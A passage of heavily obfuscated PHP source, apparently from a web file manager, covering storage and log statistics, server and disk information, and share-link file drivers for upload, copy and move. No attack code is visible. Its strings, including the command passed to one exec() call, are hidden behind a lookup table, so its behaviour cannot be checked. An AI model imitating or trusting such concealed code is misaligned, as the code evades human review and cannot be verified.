$Ä¥´˜½á =& $_SERVER[ïÃ°£«Ê]; $–šÏÍÊİ = Model($Ä¥´˜½á[617])->count($Ä¥´˜½á[1594]); $®¤é„Âû = Model($Ä¥´˜½á[617])->where($Ä¥´˜½á[2147])->count($Ä¥´˜½á[1594]); $ÇéÛŠÙ— = intval($GLOBALS[$Ä¥´˜½á[6]][$Ä¥´˜½á[424]][$Ä¥´˜½á[1927]]) / 3600; $ìŞÌíŠé = strtotime("\x2d{$ÇéÛŠÙ—}\40\x68\x6f\165\x72\163"); $È¨Úïèò = strtotime(date($Ä¥´˜½á[2129])); if ($ìŞÌíŠé < $È¨Úïèò) { $ìŞÌíŠé = $È¨Úïèò; } $Ú÷‡«× = array($Ä¥´˜½á[2148] => array($Ä¥´˜½á[1182], $ìŞÌíŠé)); $ªÈˆ¥Ö = (int) Model($Ä¥´˜½á[617])->where($Ú÷‡«×)->count($Ä¥´˜½á[1594]); if (!$ªÈˆ¥Ö) { $ªÈˆ¥Ö = 1; } $Ú÷‡«× = array($Ä¥´˜½á[2148] => array($Ä¥´˜½á[1182], $È¨Úïèò)); $Œ‡‘Œå = Model($Ä¥´˜½á[617])->where($Ú÷‡«×)->count($Ä¥´˜½á[1594]); return array($Ä¥´˜½á[860] => (int) $–šÏÍÊİ, $Ä¥´˜½á[2149] => (int) ($–šÏÍÊİ - $®¤é„Âû), $Ä¥´˜½á[2150] => (int) $®¤é„Âû, $Ä¥´˜½á[2151] => (int) $Œ‡‘Œå, $Ä¥´˜½á[2152] => $ªÈˆ¥Ö); } private function optionFile() { $ßŒŒµ§› =& $_SERVER[ïÃ°£«Ê]; $¶©¹ÀØç = $this->sourceSize(); $¾“™¯¬à = array($ßŒŒµ§›[500] => 0); $âÇçÅÇÇ = Model($ßŒŒµ§›[934])->where($¾“™¯¬à)->count(); $¾“™¯¬à[$ßŒŒµ§›[231]] = array($ßŒŒµ§›[1182], strtotime(date($ßŒŒµ§›[2129]))); $Ù Ìù†ù = Model($ßŒŒµ§›[934])->where($¾“™¯¬à)->field(array($ßŒŒµ§›[950] => $ßŒŒµ§›[951], $ßŒŒµ§›[952] => $ßŒŒµ§›[79]))->find(); $ä—¥à‡‡ = array($ßŒŒµ§›[865] => $¶©¹ÀØç[$ßŒŒµ§›[79]], $ßŒŒµ§›[2122] => $¶©¹ÀØç[$ßŒŒµ§›[2122]], $ßŒŒµ§›[2153] => $¶©¹ÀØç[$ßŒŒµ§›[79]] - $¶©¹ÀØç[$ßŒŒµ§›[2122]], $ßŒŒµ§›[2154] => (int) (isset($Ù Ìù†ù[$ßŒŒµ§›[79]]) ? $Ù Ìù†ù[$ßŒŒµ§›[79]] : 0), $ßŒŒµ§›[867] => (int) $âÇçÅÇÇ, $ßŒŒµ§›[2155] => (int) (isset($Ù Ìù†ù[$ßŒŒµ§›[951]]) ? $Ù Ìù†ù[$ßŒŒµ§›[951]] : 0)); if ($ä—¥à‡‡[$ßŒŒµ§›[2153]] < 0) { $ä—¥à‡‡[$ßŒŒµ§›[2153]] = 0; } return $ä—¥à‡‡; } private function optionAccess() { $¨ï·´ôõ =& $_SERVER[ïÃ°£«Ê]; return array($¨ï·´ôõ[860] => $this->typeLogCnt(), $¨ï·´ôõ[107] => $this->typeLogCnt($¨ï·´ôõ[107]), $¨ï·´ôõ[539] => $this->typeLogCnt($¨ï·´ôõ[539]), $¨ï·´ôõ[1336] => $this->typeLogCnt($¨ï·´ôõ[1336]), $¨ï·´ôõ[1563] => $this->typeLogCnt($¨ï·´ôõ[1563]), $¨ï·´ôõ[684] => $this->typeLogCnt($¨ï·´ôõ[12], $¨ï·´ôõ[2133])); } private function typeLogCnt($ƒ¾¢ïæ = '', $ëî™±¦î = "\x69\x64") { $«ó÷ô‹Í =& $_SERVER[ïÃ°£«Ê]; $’¢üÔÀé = array($«ó÷ô‹Í[107] => array($«ó÷ô‹Í[2156], $«ó÷ô‹Í[2157]), $«ó÷ô‹Í[539] => array($«ó÷ô‹Í[2158], $«ó÷ô‹Í[2159]), $«ó÷ô‹Í[1336] => array($«ó÷ô‹Í[2160], $«ó÷ô‹Í[2161], $«ó÷ô‹Í[2162]), $«ó÷ô‹Í[1563] => array($«ó÷ô‹Í[2163], $«ó÷ô‹Í[2164]), $«ó÷ô‹Í[1564] => array($«ó÷ô‹Í[2165], $«ó÷ô‹Í[2166], $«ó÷ô‹Í[2167])); $ïä­üùù = strtotime(date($«ó÷ô‹Í[2129])); $ÀÒëÎ‘ó = array($«ó÷ô‹Í[231] => array($«ó÷ô‹Í[1182], $ïä­üùù)); if ($ƒ¾¢ïæ) { $ÀÒëÎ‘ó[$«ó÷ô‹Í[33]] = array($«ó÷ô‹Í[7], $’¢üÔÀé[$ƒ¾¢ïæ]); } $ßÉÔ«À = Model($«ó÷ô‹Í[2132])->where($ÀÒëÎ‘ó)->count($ëî™±¦î); return (int) $ßÉÔ«À; } private function optionServer() { $Ñİ„åºÛ =& $_SERVER[ïÃ°£«Ê]; $é·‚º = $this->diskDriver(); $ ÙÈÁş× = KodIO::defaultDriver(); $ôÚ—Ë¤‚ = array($Ñİ„åºÛ[927] => $ ÙÈÁş×[$Ñİ„åºÛ[487]]); $Š©šÀ¿© = Model($Ñİ„åºÛ[560])->where($ôÚ—Ë¤‚)->sum($Ñİ„åºÛ[79]); $Éµ¥€¨¥ = explode($Ñİ„åºÛ[53], $_SERVER[$Ñİ„åºÛ[144]]); $ô©ç°Ş† = $Éµ¥€¨¥[0]; $×ıÑã¿£ = $GLOBALS[$Ñİ„åºÛ[6]][$Ñİ„åºÛ[21]]; $ã¦´ØÉ° = $×ıÑã¿£[$Ñİ„åºÛ[1144]]; if ($ã¦´ØÉ° == $Ñİ„åºÛ[1132]) { $”ÏÄİê = explode($Ñİ„åºÛ[1475], $×ıÑã¿£[$Ñİ„åºÛ[1143]]); $ã¦´ØÉ° = $”ÏÄİê[0]; } if ($ã¦´ØÉ° == $Ñİ„åºÛ[1077] || $ã¦´ØÉ° == $Ñİ„åºÛ[902]) { $¶ü°Ù…ª = Model()->db()->query($Ñİ„åºÛ[2168]); $ÒòÖı¾‰ = $¶ü°Ù…ª[0] && isset($¶ü°Ù…ª[0][$Ñİ„åºÛ[1868]]) ? $¶ü°Ù…ª[0][$Ñİ„åºÛ[1868]] : 0; $ã¦´ØÉ° = $Ñİ„åºÛ[2169] . ($ÒòÖı¾‰ ? $Ñİ„åºÛ[8] . $ÒòÖı¾‰ : $Ñİ„åºÛ[12]); } $÷¡’äİ³ = $GLOBALS[$Ñİ„åºÛ[6]][$Ñİ„åºÛ[424]][$Ñİ„åºÛ[981]]; return array($Ñİ„åºÛ[2170] => $é·‚º ? $é·‚º[$Ñİ„åºÛ[2171]] : 0, $Ñİ„åºÛ[2172] => $é·‚º ? $é·‚º[$Ñİ„åºÛ[2173]] : 0, $Ñİ„åºÛ[2174] => (int) $ ÙÈÁş×[$Ñİ„åºÛ[2171]] * 1024 * 1024 * 1024, $Ñİ„åºÛ[2175] => (int) $Š©šÀ¿©, $Ñİ„åºÛ[2176] => ucfirst($ô©ç°Ş†), $Ñİ„åºÛ[2177] => $Ñİ„åºÛ[2178] . PHP_VERSION, $Ñİ„åºÛ[2179] => phpBuild64() ? 64 : 32, $Ñİ„åºÛ[859] => str_replace($Ñİ„åºÛ[1310], $Ñİ„åºÛ[1160], $ã¦´ØÉ°), $Ñİ„åºÛ[424] => ucfirst($÷¡’äİ³), $Ñİ„åºÛ[32] => $_SERVER[$Ñİ„åºÛ[2180]]); } private function diskDriver() { $àÂøä‡… =& $_SERVER[ïÃ°£«Ê]; $²ŠÃŠ¬É = $àÂøä‡…[8]; $”¸ƒÑ±ƒ = $GLOBALS[$àÂøä‡…[6]][$àÂøä‡…[1499]] == $àÂøä‡…[1500]; if ($”¸ƒÑ±ƒ) { $²ŠÃŠ¬É = $àÂøä‡…[2181]; if (function_exists($àÂøä‡…[2182])) { exec($àÂøä‡…[2183], $¡ºƒç³); $²ŠÃŠ¬É = $¡ºƒç³[1] . $àÂøä‡…[8]; } } if (!file_exists($²ŠÃŠ¬É)) { return; } if (!function_exists($àÂøä‡…[2184])) { return; } $ÍÍï‘½© = @disk_total_space($²ŠÃŠ¬É); $® ëÙ‚Æ = $ÍÍï‘½© - @disk_free_space($²ŠÃŠ¬É); return array($àÂøä‡…[2171] => $ÍÍï‘½©, $àÂøä‡…[2173] => $® ëÙ‚Æ); } public function fileChart($ÎÉáËÇ›) { $ï–±ˆÆ³ =& $_SERVER[ïÃ°£«Ê]; $‹×†Ÿ  = Model($ï–±ˆÆ³[934]); if (isset($ÎÉáËÇ›[$ï–±ˆÆ³[1594]])) { return $‹×†Ÿ ->userFileTypeProfile($ÎÉáËÇ›[$ï–±ˆÆ³[1594]]); } if (isset($ÎÉáËÇ›[$ï–±ˆÆ³[1497]])) { return $‹×†Ÿ ->groupFileTypeProfile($ÎÉáËÇ›[$ï–±ˆÆ³[1497]]); } $Öş¥«Şñ = $this->sourceSize(); return array($ï–±ˆÆ³[865] => $Öş¥«Şñ[$ï–±ˆÆ³[79]], $ï–±ˆÆ³[2122] => $Öş¥«Şñ[$ï–±ˆÆ³[2122]], $ï–±ˆÆ³[2123] => $‹×†Ÿ ->where(array($ï–±ˆÆ³[188] => 1, $ï–±ˆÆ³[190] => 0))->sum($ï–±ˆÆ³[79]), $ï–±ˆÆ³[2124] => $‹×†Ÿ ->where(array($ï–±ˆÆ³[188] => 2, $ï–±ˆÆ³[190] => 0))->sum($ï–±ˆÆ³[79])); } private function sourceSize() { $Õ¡·ìª =& $_SERVER[ïÃ°£«Ê]; $âĞú¶å = Model($Õ¡·ìª[934])->where(array($Õ¡·ìª[500] => 0))->sum($Õ¡·ìª[79]); $»Ü…òõ¿ = Model($Õ¡·ìª[2185])->sum($Õ¡·ìª[79]); $œöÀßäÍ = Model($Õ¡·ìª[560])->sum($Õ¡·ìª[79]); return array($Õ¡·ìª[79] => (int) $âĞú¶å + (int) $»Ü…òõ¿, $Õ¡·ìª[2122] => (int) $œöÀßäÍ); } } goto A¨Êõò“…å; BùĞ‡İÓŸ˜: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($‰ÄóàçÊ) { $this->pathParse = $‰ÄóàçÊ; } protected function infoParse($Ãâæ¶–¾, $¢Áõ¦Ø = false) { $´ò–Çãã =& $_SERVER[ïÃ°£«Ê]; return Action($´ò–Çãã[1365])->sharePathInfo($this->pathParse[$´ò–Çãã[87]], !0, $¢Áõ¦Ø); } public function listPath($Å¹·¦ë‰, $Ëç›’ = false) { $ÌšÀ·İâ =& $_SERVER[ïÃ°£«Ê]; $ë“ ¬÷ı = IO::listPath($Å¹·¦ë‰, $Ëç›’); if (!$ë“ ¬÷ı) { return $ë“ ¬÷ı; } if (is_array($ë“ ¬÷ı[$ÌšÀ·İâ[968]])) { $¾¿üÈ¶Ô = Action($ÌšÀ·İâ[1551])->parsePathChildren($ë“ ¬÷ı[$ÌšÀ·İâ[968]], array($ÌšÀ·İâ[510] => $Å¹·¦ë‰)); $ë“ ¬÷ı[$ÌšÀ·İâ[968]] = Action($ÌšÀ·İâ[1365])->shareItemInfo($¾¿üÈ¶Ô); } foreach ($ë“ ¬÷ı as $ğŸÎ§Š× => $ÈŞùñÚ¬) { if (!in_array($ğŸÎ§Š×, array($ÌšÀ·İâ[86], $ÌšÀ·İâ[85]))) { continue; } foreach ($ÈŞùñÚ¬ as $çšøÜ–Ò => $¾¿üÈ¶Ô) { $¾¿üÈ¶Ô = Action($ÌšÀ·İâ[1551])->parsePathChildren($¾¿üÈ¶Ô, array($ÌšÀ·İâ[510] => $Å¹·¦ë‰)); $ë“ ¬÷ı[$ğŸÎ§Š×][$çšøÜ–Ò] = Action($ÌšÀ·İâ[1365])->shareItemInfo($¾¿üÈ¶Ô); } } return $ë“ ¬÷ı; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($®Ä©’¼) { $¹·ƒÖ¾‡ =& $_SERVER[ïÃ°£«Ê]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $®Ä©’¼; $¢‚¨ñ¸ = Model($¹·ƒÖ¾‡[686])->getInfo($®Ä©’¼[$¹·ƒÖ¾‡[487]]); $ªÕê…Ö¡ = _get($¢‚¨ñ¸, $¹·ƒÖ¾‡[580]); $Ö¥ñå•÷ = Model($¹·ƒÖ¾‡[587])->authMake(_get($¢‚¨ñ¸, $¹·ƒÖ¾‡[1552])); if (!$¢‚¨ñ¸) { IO::errorTips(LNG($¹·ƒÖ¾‡[1553]), !1); } if (!$Ö¥ñå•÷) { IO::errorTips(LNG($¹·ƒÖ¾‡[1554]), !1); } if ($ªÕê…Ö¡ && is_string($ªÕê…Ö¡)) { $ªÕê…Ö¡ = json_decode($ªÕê…Ö¡, !0); } if (!$ªÕê…Ö¡ || !$Ö¥ñå•÷) { return; } $this->_config = array($¹·ƒÖ¾‡[1359] => rtrim($®Ä©’¼[$¹·ƒÖ¾‡[1359]], $¹·ƒÖ¾‡[8]) . $¹·ƒÖ¾‡[8], $¹·ƒÖ¾‡[1555] => $¹·ƒÖ¾‡[1463] . $ªÕê…Ö¡[$¹·ƒÖ¾‡[1556]] . $¹·ƒÖ¾‡[499], $¹·ƒÖ¾‡[576] => $¢‚¨ñ¸, $¹·ƒÖ¾‡[580] => $ªÕê…Ö¡, $¹·ƒÖ¾‡[1557] => $Ö¥ñå•÷, $¹·ƒÖ¾‡[1558] => substr(APP_HOST, 0, 8) == $¹·ƒÖ¾‡[217], $¹·ƒÖ¾‡[1559] => Model($¹·ƒÖ¾‡[591])->authCheck($Ö¥ñå•÷[$¹·ƒÖ¾‡[503]], AuthModel::AUTH_VIEW, !1), $¹·ƒÖ¾‡[1560] => Model($¹·ƒÖ¾‡[591])->authCheck($Ö¥ñå•÷[$¹·ƒÖ¾‡[503]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($¤©ÈÆˆâ) { $•ıÁòˆÄ =& $_SERVER[ïÃ°£«Ê]; $­úìÀ÷Ô = $this->_config; if (!$­úìÀ÷Ô) { return !1; } $ÅúàÌŞ— = array($•ıÁòˆÄ[1561] => $­úìÀ÷Ô[$•ıÁòˆÄ[1559]], $•ıÁòˆÄ[1562] => $­úìÀ÷Ô[$•ıÁòˆÄ[1559]], $•ıÁòˆÄ[1387] => $­úìÀ÷Ô[$•ıÁòˆÄ[1559]], $•ıÁòˆÄ[107] => $­úìÀ÷Ô[$•ıÁòˆÄ[1560]], $•ıÁòˆÄ[1563] => $­úìÀ÷Ô[$•ıÁòˆÄ[1560]], $•ıÁòˆÄ[1336] => $­úìÀ÷Ô[$•ıÁòˆÄ[1560]], $•ıÁòˆÄ[1564] => !1, $•ıÁòˆÄ[429] => !1, $•ıÁòˆÄ[1565] => !1, $•ıÁòˆÄ[1566] => !1); return $ÅúàÌŞ—[$¤©ÈÆˆâ]; } public function listPath($çÉ‡¬Ñ, $¦«×í•ş = false) { return $this->request($_SERVER[ïÃ°£«Ê][1567], array($çÉ‡¬Ñ)); } public function setContent($†”åïĞ, $¶œğ†û· = '') { return $this->request($_SERVER[ïÃ°£«Ê][1568], array($†”åïĞ, $¶œğ†û·)); } public function getContent($¸¹ÉÅ) { return $this->_fileSubstr($¸¹ÉÅ); } public function fileSubstr($ÆÁüó”Å, $—Ãé¢Å¥, $ÚÑúŸ¸å) { return $this->_fileSubstr($ÆÁüó”Å, $—Ãé¢Å¥, $ÚÑúŸ¸å); } public function download($‰ÓÆ¦à½, $Òû¡à) { return $this->_download($‰ÓÆ¦à½, $Òû¡à); } public function isFileOutServer() { return !1; } public function fileOut($£¢ßŞ›Ô, $…Óß¦ßø = false, $‘úÏ¨Ç = false, $’²ĞûºÏ = '') { $ÚıÁ£ =& $_SERVER[ïÃ°£«Ê]; $this->fileOutLink($this->_fileLink($£¢ßŞ›Ô, ($’²ĞûºÏ ? $ÚıÁ£[1569] . $’²ĞûºÏ : $ÚıÁ£[12]) . ($…Óß¦ßø ? $ÚıÁ£[1570] : $ÚıÁ£[12]))); } public function fileOutImage($×Ùç÷Ã, $í®ğğ¸ = 250) { $this->fileOutLink($this->_fileLink($×Ùç÷Ã, $_SERVER[ïÃ°£«Ê][1571] . $í®ğğ¸)); } public function fileOutLink($ãşëÛ) { header($_SERVER[ïÃ°£«Ê][172] . $this->urlAuto($ãşëÛ)); die; } public function exist($Õº¹ªÈó) { $ş“›…î¦ = $this->_info($Õº¹ªÈó); return $ş“›…î¦ ? !0 : !1; } public function isFile($öÅÓš›˜) { $Ä—§¨óã =& $_SERVER[ïÃ°£«Ê]; $—œÀŞú = $this->_info($öÅÓš›˜); return _get($—œÀŞú, $Ä—§¨óã[33], $Ä—§¨óã[12]) == $Ä—§¨óã[230]; } public function isFolder($¡Öì²¾è) { $‡¸ñÒì… =& $_SERVER[ïÃ°£«Ê]; $¬€”ºá° = $this->_info($¡Öì²¾è); return _get($¬€”ºá°, $‡¸ñÒì…[33], $‡¸ñÒì…[12]) == $‡¸ñÒì…[78]; } public function size($äËš¬Œ) { $©ÊôæØ÷ = $this->_info($äËš¬Œ); return _get($©ÊôæØ÷, $_SERVER[ïÃ°£«Ê][79], 0); } public function info($÷“è¡Ú¯) { return $this->_info($÷“è¡Ú¯); } public function infoAuth($è„®ş¤Ö) { return $this->_info($è„®ş¤Ö); } public function infoFull($÷†ÄæŞé) { return $this->_info($÷†ÄæŞé); } public function infoFullSimple($‡¬÷°³) { return $this->_info($‡¬÷°³); } public function infoWithChildren($ ëŸç˜) { return $this->_info($ ëŸç˜, !0); } public function has($°®ŸÇ—°, $ï ƒ•úÈ = false, $´ú¼ó²æ = false) { $ÇÃµÊ® =& $_SERVER[ïÃ°£«Ê]; $ÅÄ•¸ôå = $this->_info($°®ŸÇ—°); if (!$ÅÄ•¸ôå) { return !1; } if ($ï ƒ•úÈ) { return array($ÇÃµÊ®[239] => $ÅÄ•¸ôå[$ÇÃµÊ®[239]], $ÇÃµÊ®[240] => $ÅÄ•¸ôå[$ÇÃµÊ®[240]]); } return $†÷Şä«í ? $ÅÄ•¸ôå[$ÇÃµÊ®[239]] > 0 : $ÅÄ•¸ôå[$ÇÃµÊ®[240]] > 0; } public function mkfile($Ö€å›¾İ, $§ÉŞİ’ = '', $ İ­¶ˆŸ = REPEAT_RENAME) { return $this->request($_SERVER[ïÃ°£«Ê][1544], array($Ö€å›¾İ, $§ÉŞİ’, $ İ­¶ˆŸ)); } public function mkdir($‡Ï¦Ş™, $£ÊËËû = REPEAT_SKIP) { return $this->request($_SERVER[ïÃ°£«Ê][1545], array($‡Ï¦Ş™, $£ÊËËû)); } public function remove($‘¦ğŸ) { return $this->request($_SERVER[ïÃ°£«Ê][1336], array($‘¦ğŸ)); } public function rename($èüÂ³Û, $ù“›ÕÙş) { return $this->request($_SERVER[ïÃ°£«Ê][1548], array($èüÂ³Û, $ù“›ÕÙş)); } public function moveSameAllow() { } public function copy($üŠç¦°, $½±Şüİ, $ĞØ‚Ì£ = REPEAT_REPLACE, $€ÌøúÌ = false) { return $this->request($_SERVER[ïÃ°£«Ê][641], array($üŠç¦°, $½±Şüİ, $ĞØ‚Ì£)); } public function move($…˜Ï²Óş, $Š ³ÎÄŠ, $‚‰İ…À‰ = REPEAT_REPLACE, $ú„·Ó© = false) { return $this->request($_SERVER[ïÃ°£«Ê][643], array($…˜Ï²Óş, $Š ³ÎÄŠ, $‚‰İ…À‰)); } public function uploadLink($é”‹¼‚³, $È©Ë©à = 0) { $ØÜïñæĞ =& $_SERVER[ïÃ°£«Ê]; $¥´¸œÖ = IO::init($GLOBALS[$ØÜïñæĞ[7]][$ØÜïñæĞ[87]]); $Ãé÷”‡  = $this->pathApiEncode($¥´¸œÖ->path); $ú®Š¹Ã” = $this->requestMakeUrl($ØÜïñæĞ[1572], array($ØÜïñæĞ[87] => $Ãé÷”‡ )); return array($ØÜïñæĞ[1573] => $ú®Š¹Ã”); } public function upload($»Ğ¦÷Ó, $ü†äÉÙ, $ãèã®­» = false, $Ëƒ¶äÍ¹ = REPEAT_REPLACE) { $áòŒ¶™ =& $_SERVER[ïÃ°£«Ê]; if (filesize($ü†äÉÙ) < $this->uploadChunkSize) { return $this->request($áòŒ¶™[107], array($»Ğ¦÷Ó, $ü†äÉÙ, $Ëƒ¶äÍ¹)); } $ÈÍŸıÚá = $this->uploadHashCheck($»Ğ¦÷Ó, $ü†äÉÙ, $Ëƒ¶äÍ¹); if ($ÈÍŸıÚá) { return $ÈÍŸıÚá; } $˜ùÙ»íû = @filesize($ü†äÉÙ); $Ä³êí†â = $this->uploadChunkSize; $™Œ“ßÆÔ = ceil($˜ùÙ»íû / $Ä³êí†â); $ÜÓÆª = 0; while ($ÜÓÆª < $™Œ“ßÆÔ) { $şüëÌ†ù = IO::fileSubstr($ü†äÉÙ, $ÜÓÆª * $Ä³êí†â, $Ä³êí†â); $òÄÊúÅò = $this->tempFile($áòŒ¶™[12], $şüëÌ†ù); $¼¬š‡Ÿ¿ = array($áòŒ¶™[79] => $˜ùÙ»íû, $áòŒ¶™[1574] => $Ä³êí†â, $áòŒ¶™[1575] => $™Œ“ßÆÔ, $áòŒ¶™[1576] => $ÜÓÆª); $Àà¼¼  = $this->uploadSend($»Ğ¦÷Ó, $òÄÊúÅò, $¼¬š‡Ÿ¿, $Ëƒ¶äÍ¹); $ÜÓÆª++; if (!$Àà¼¼ ) { return !1; } } if (!is_array($Àà¼¼ ) || empty($Àà¼¼ [$áòŒ¶™[595]])) { return !1; } return $this->pathApiDecode($Àà¼¼ [$áòŒ¶™[595]]); } private function uploadHashCheck($°ÈÔŒÓ˜, $İ²ÈœŞ±, $â³›ııÇ) { $òŒ£§ =& $_SERVER[ïÃ°£«Ê]; $¢Ğ¬‡Œá = IO::hashSimple($İ²ÈœŞ±); $Şú²®Í = array($òŒ£§[1577] => $òŒ£§[1578], $òŒ£§[1537] => $¢Ğ¬‡Œá); $ñáØœÀõ = $this->uploadSend($°ÈÔŒÓ˜, $òŒ£§[12], $Şú²®Í, $â³›ııÇ); $Ùª¨ºòÑ = _get($ñáØœÀõ, $òŒ£§[595], array()); $ÇÖÒ×Ãú = _get($Ùª¨ºòÑ, $òŒ£§[1579]); if (!is_array($ÇÖÒ×Ãú) || !$ÇÖÒ×Ãú[$òŒ£§[563]]) { return !1; } $ÓÄé°ë¹ = IO::hashMd5($İ²ÈœŞ±); if ($ÇÖÒ×Ãú[$òŒ£§[563]] != $ÓÄé°ë¹) { return !1; } if ($ñáØœÀõ[$òŒ£§[595]][$òŒ£§[1580]]) { $this->uploadChunkSize = $ñáØœÀõ[$òŒ£§[595]][$òŒ£§[1580]]; } $Şú²®Í = array($òŒ£§[1577] => $òŒ£§[1581], $òŒ£§[1538] => $ÓÄé°ë¹, $òŒ£§[1537] => $¢Ğ¬‡Œá); $ñáØœÀõ = $this->uploadSend($°ÈÔŒÓ˜, $òŒ£§[12], $Şú²®Í, $â³›ııÇ); if (!is_array($ñáØœÀõ) || empty($ñáØœÀõ[$òŒ£§[595]])) { return !1; } return $this->pathApiDecode($ñáØœÀõ[$òŒ£§[595]]); } private function uploadSend($¼è‡­¯æ, $§ñÆ§£, $¶÷£ŸµË, $ÌÃäåÈ§ = '') { $ÂÉáº¤æ =& $_SERVER[ïÃ°£«Ê]; $¶÷£ŸµË[$ÂÉáº¤æ[32]] = get_path_this($¼è‡­¯æ); $¶÷£ŸµË[$ÂÉáº¤æ[87]] = $this->pathApiEncode(get_path_father($¼è‡­¯æ)); if ($ÌÃäåÈ§) { $¶÷£ŸµË[$ÂÉáº¤æ[1582]] = $ÌÃäåÈ§; } if ($§ñÆ§£) { $¶÷£ŸµË[$ÂÉáº¤æ[230]] = $ÂÉáº¤æ[1400] . $§ñÆ§£; } return $this->requestSend($ÂÉáº¤æ[1572], $¶÷£ŸµË); } protected function pathApiEncode($Â”“ıü·) { $Â–úƒ‰ =& $_SERVER[ïÃ°£«Ê]; $µàæÖù = $this->_config[$Â–úƒ‰[1555]]; $¦Á™ñá = strlen($µàæÖù); if (substr($Â”“ıü·, 0, $¦Á™ñá) == $µàæÖù) { return $Â”“ıü·; } return $µàæÖù . ltrim($Â”“ıü·, $Â–úƒ‰[8]); } protected function pathApiDecode($×ŸÎØÛ¶) { $°˜“çİš =& $_SERVER[ïÃ°£«Ê]; $õµ»âß = $this->_config[$°˜“çİš[1555]]; $Ğï…“³ = strlen($õµ»âß); if (substr($×ŸÎØÛ¶, 0, $Ğï…“³) !== $õµ»âß) { return $×ŸÎØÛ¶; } return $this->_config[$°˜“çİš[1359]] . ltrim(substr($×ŸÎØÛ¶, $Ğï…“³), $°˜“çİš[8]); } private function pathInfoParse(&$ú”¡Êç) { $à„êéŠó =& $_SERVER[ïÃ°£«Ê]; $‚·Œ¸³ = $this->_config; $È™Àôêİ = $‚·Œ¸³[$à„êéŠó[576]]; if (!$ú”¡Êç || !is_array($ú”¡Êç)) { return $ú”¡Êç; } static $ù½–Ê¦í = array(); $ìæÌÑÚ = $ù½–Ê¦í[$È™Àôêİ[$à„êéŠó[687]]]; if (!is_array($ìæÌÑÚ)) { $šÔäğÈê = LNG($à„êéŠó[1583]); $¹åßÛà = $‚·Œ¸³[$à„êéŠó[580]][$à„êéŠó[90]]; $—¦é›© = parse_url($‚·Œ¸³[$à„êéŠó[580]][$à„êéŠó[1584]]); $É€¬õ†® = $‚·Œ¸³[$à„êéŠó[580]][$à„êéŠó[1585]]; $ìæÌÑÚ = array($à„êéŠó[1586] => $¹åßÛà[$à„êéŠó[32]] . $à„êéŠó[1065] . $É€¬õ†® . $à„êéŠó[1400] . $—¦é›©[$à„êéŠó[206]] . $à„êéŠó[1067], $à„êéŠó[1587] => $šÔäğÈê . $à„êéŠó[1134] . $‚·Œ¸³[$à„êéŠó[580]][$à„êéŠó[1584]] . $à„êéŠó[1588] . LNG($à„êéŠó[1589]) . $à„êéŠó[1134] . $É€¬õ†®, $à„êéŠó[1590] => LNG($à„êéŠó[1591]) . $à„êéŠó[1592] . $‚·Œ¸³[$à„êéŠó[580]][$à„êéŠó[1584]] . $à„êéŠó[285] . LNG($à„êéŠó[1593]) . $à„êéŠó[1592] . $¹åßÛà[$à„êéŠó[602]], $à„êéŠó[1585] => array($à„êéŠó[32] => $É€¬õ†®, $à„êéŠó[1594] => $à„êéŠó[1595]), $à„êéŠó[1596] => Action($à„êéŠó[1542])->shareTargetMake($È™Àôêİ[$à„êéŠó[1552]])); $ù½–Ê¦í[$È™Àôêİ[$à„êéŠó[687]]] = $ìæÌÑÚ; } unset($ú”¡Êç[$à„êéŠó[191]]); unset($ú”¡Êç[$à„êéŠó[604]]); unset($ú”¡Êç[$à„êéŠó[188]]); unset($ú”¡Êç[$à„êéŠó[589]]); $ú”¡Êç[$à„êéŠó[1597]] = !0; $ú”¡Êç[$à„êéŠó[232]] = $‚·Œ¸³[$à„êéŠó[1559]]; $ú”¡Êç[$à„êéŠó[233]] = $‚·Œ¸³[$à„êéŠó[1560]]; $ú”¡Êç[$à„êéŠó[502]] = $‚·Œ¸³[$à„êéŠó[1557]]; $ú”¡Êç[$à„êéŠó[1585]] = $ìæÌÑÚ[$à„êéŠó[1585]]; $ú”¡Êç[$à„êéŠó[1598]] = $È™Àôêİ[$à„êéŠó[231]]; $ú”¡Êç[$à„êéŠó[1599]] = $È™Àôêİ[$à„êéŠó[88]]; $ú”¡Êç[$à„êéŠó[1600]] = $ìæÌÑÚ[$à„êéŠó[1590]]; $ú”¡Êç[$à„êéŠó[1596]] = $ìæÌÑÚ[$à„êéŠó[1596]]; $ú”¡Êç[$à„êéŠó[687]] = $È™Àôêİ[$à„êéŠó[687]]; $¬ä²¢„ö = explode($à„êéŠó[8], trim($ú”¡Êç[$à„êéŠó[602]], $à„êéŠó[8])); $¬ä²¢„ö[0] = $ìæÌÑÚ[$à„êéŠó[1586]]; $ú”¡Êç[$à„êéŠó[602]] = implode($à„êéŠó[8], $¬ä²¢„ö); if (count($¬ä²¢„ö) > 1) { unset($ú”¡Êç[$à„êéŠó[1596]]); } if (count($¬ä²¢„ö) == 1) { if ($ú”¡Êç[$à„êéŠó[33]] == $à„êéŠó[78]) { $ú”¡Êç[$à„êéŠó[32]] = $ìæÌÑÚ[$à„êéŠó[1586]]; } array_set_value($ú”¡Êç, $à„êéŠó[1601], $ìæÌÑÚ[$à„êéŠó[1587]]); } $Àô¿Ü¢‰ = array($à„êéŠó[1602], $à„êéŠó[1522], $à„êéŠó[1603], $à„êéŠó[1604]); foreach ($Àô¿Ü¢‰ as $¡’¸ÜñÔ) { $¤ìÇÁÎ€ = $this->urlAuto(_get($ú”¡Êç, $¡’¸ÜñÔ, $à„êéŠó[12])); if ($¤ìÇÁÎ€) { array_set_value($ú”¡Êç, $¡’¸ÜñÔ, $¤ìÇÁÎ€); } } } private function _info($Ò•ƒÖ«, $Ó•ÖµÑ¼ = false) { $ñµ— =& $_SERVER[ïÃ°£«Ê]; $óµ†ëúó = $this->_config; if (!$óµ†ëúó) { return !1; } static $‡»âØËõ = array(); if (isset($‡»âØËõ[$Ò•ƒÖ«]) && is_array($‡»âØËõ[$Ò•ƒÖ«])) { return $‡»âØËõ[$Ò•ƒÖ«]; } if ((!$Ò•ƒÖ« || !trim($Ò•ƒÖ«, $ñµ—[8])) && !$Ó•ÖµÑ¼) { $ÆÆß®îÖ = $óµ†ëúó[$ñµ—[580]][$ñµ—[90]]; if (!$ÆÆß®îÖ) { return !1; } $ÆÆß®îÖ[$ñµ—[602]] = $ñµ—[12]; $ÆÆß®îÖ[$ñµ—[87]] = $óµ†ëúó[$ñµ—[1359]]; $this->pathInfoParse($ÆÆß®îÖ); return 